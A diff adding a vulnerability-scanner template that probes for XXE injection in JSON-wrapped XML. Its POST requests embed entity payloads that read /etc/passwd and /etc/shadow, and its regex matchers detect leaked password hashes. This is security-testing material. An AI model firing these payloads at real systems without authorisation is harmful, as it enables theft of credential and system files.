@@ -1,0 +1,41 @@
+id: xxe-json-wrapped-post
+info:
+  name: XXE - JSON-Wrapped XML Payload (POST)
+  author: security-team
+  severity: high
+  description: |
+    Tests for XXE when XML is wrapped inside JSON payload.
+  tags: xxe,json,xml,polyglot
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-611
+
+http:
+  - raw:
+      - |
+        POST {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+          "xml": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"
+        }
+
+      - |
+        POST {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+          "data": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><foo>&xxe;</foo>",
+          "format": "xml"
+        }
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - '(?im)^(?:root|daemon|bin):.*:0:0:'
+          - '(\$[156]\$[A-Za-z0-9./]{16,})'   # common linux shadow hash formats ($1,$5,$6) with salt/hash
